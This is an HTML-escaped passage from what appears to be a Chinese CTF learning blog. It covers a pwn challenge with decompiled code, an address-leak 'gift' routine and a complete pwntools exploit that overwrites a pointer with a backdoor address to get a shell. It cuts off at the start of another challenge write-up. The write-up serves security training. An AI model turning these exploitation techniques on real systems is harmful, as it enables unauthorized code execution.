&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.init_array:&lt;span class=&#34;number&#34;&gt;0000000000003&lt;/span&gt;D60                 ;org &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;D60h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array:&lt;span class=&#34;number&#34;&gt;0000000000003&lt;/span&gt;D60 off_3D60        dq offset sub_11C0      ; DATA XREF: LOAD:&lt;span class=&#34;number&#34;&gt;0000000000000168&lt;/span&gt;↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array:&lt;span class=&#34;number&#34;&gt;0000000000003&lt;/span&gt;D60                                         ; LOAD:&lt;span class=&#34;number&#34;&gt;00000000000002F&lt;/span&gt;0↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array:&lt;span class=&#34;number&#34;&gt;0000000000003&lt;/span&gt;D68                 dq offset sub_144E&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array:&lt;span class=&#34;number&#34;&gt;0000000000003&lt;/span&gt;D68 _init_array     ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array:&lt;span class=&#34;number&#34;&gt;0000000000003&lt;/span&gt;D68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_144E&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(_QWORD *)(((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64)&amp;amp;unk_5018 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFFFFFFF000&lt;/span&gt;LL) + &lt;span class=&#34;number&#34;&gt;0x29C0&lt;/span&gt;) = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)sub_1278 - &lt;span class=&#34;number&#34;&gt;0xDEADBF61&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v1 - __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		所以就可以先通过调用gift来进行泄露地址,0x29C0 &amp;#x3D; 10688 , 10688&amp;#x2F;8 &amp;#x3D; 1336,这是因为指针的偏移,按照char类型来算????? 是吗?&lt;/p&gt;
&lt;p&gt;​	因为在main中还有个-1,所以是1337,输入1337就可以调用gift了!&lt;/p&gt;
&lt;h2 id=&#34;最终步骤&#34;&gt;&lt;a href=&#34;#最终步骤&#34; class=&#34;headerlink&#34; title=&#34;最终步骤&#34;&gt;&lt;/a&gt;最终步骤&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;choice: &lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ok, you find the gift&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5557ed770206&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x7f1094c79d80&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5557eea752a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		之前取这些数据的时候老出问题…….&lt;/p&gt;
&lt;p&gt;​		先把前面的数据接收了,然后再接收三个值,怎么接收呢,可以按照长度来,但是感觉比较der,还是看老曹的..recvline之后strip去掉最后的空格,然后decode解码,然后通过”, “分割,这样gift就成了数组, 0 1 2 对应着三个值,就可以了!&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gift = (p.recvline().strip()).decode().split(&lt;span class=&#34;string&#34;&gt;&amp;#x27;, &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pie = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(gift[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;0x1206&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(pie))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_heap_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(gift[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(leak_heap_addr))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vul_addr = leak_heap_addr + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		然后把后门地址写入堆地址,此时也有堆的地址了,再次利用main函数中的调用逻辑,调用就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;backdoor_addr = pie + &lt;span class=&#34;number&#34;&gt;0x11c9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;choice: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(p64(backdoor_addr - &lt;span class=&#34;number&#34;&gt;0xdeadbeef&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;trigger_input = (vul_addr - pie - &lt;span class=&#34;number&#34;&gt;0x5000&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;// 8 + 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&amp;#x2F;&amp;#x2F;是整除的意思&lt;/p&gt;
&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = &lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p =remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;xxxxx&amp;quot;&lt;/span&gt;, xxx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;choice: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Ok, you find the gift\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gift = (p.recvline().strip()).decode().split(&lt;span class=&#34;string&#34;&gt;&amp;#x27;, &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pie = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(gift[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;0x1206&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(pie))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_heap_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(gift[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(leak_heap_addr))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vul_addr = leak_heap_addr + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backdoor_addr = pie + &lt;span class=&#34;number&#34;&gt;0x11c9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;choice: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(p64(backdoor_addr - &lt;span class=&#34;number&#34;&gt;0xdeadbeef&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;trigger_input = (vul_addr - pie - &lt;span class=&#34;number&#34;&gt;0x5000&lt;/span&gt;) // &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;choice: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(trigger_input))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;待解决&#34;&gt;&lt;a href=&#34;#待解决&#34; class=&#34;headerlink&#34; title=&#34;待解决&#34;&gt;&lt;/a&gt;待解决&lt;/h1&gt;&lt;p&gt;这个题如果正向写代码,要怎么写呢?&lt;/p&gt;
&lt;p&gt;ida一开始进去不是main而是…这里是否…&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-06-02T13:00:51.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/</id>
        <title>pwn入门-27-5月乙队月赛三题</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/"/>
        <content type="html">&lt;p&gt;​		这次月赛的pwn,出的偏简单,终于能做出题来了……..不过在做题的时候很多小点有点卡,所以平常要把这些知识点,细节都补充完整和练熟.&lt;/p&gt;
&lt;p&gt;​		题目文件: 本链接+题目文件名&lt;/p&gt;
&lt;h1 id=&#34;1-easy-leak&#34;&gt;&lt;a href=&#34;#1-easy-leak&#34; class=&#34;headerlink&#34; title=&#34;1.easy_leak&#34;&gt;&lt;/a&gt;1.easy_leak&lt;/h1&gt;&lt;p&gt;​		本身题目不难,但是自己越做越复杂了..整体的思路还是有待加强.&lt;/p&gt;
&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a href=&#34;#题目分析&#34; class=&#34;headerlink&#34; title=&#34;题目分析&#34;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, my beeeest friend!Also a small chal for you!Good luck!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1. Read num&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2. Write num&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;0. Exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; choice; &lt;span 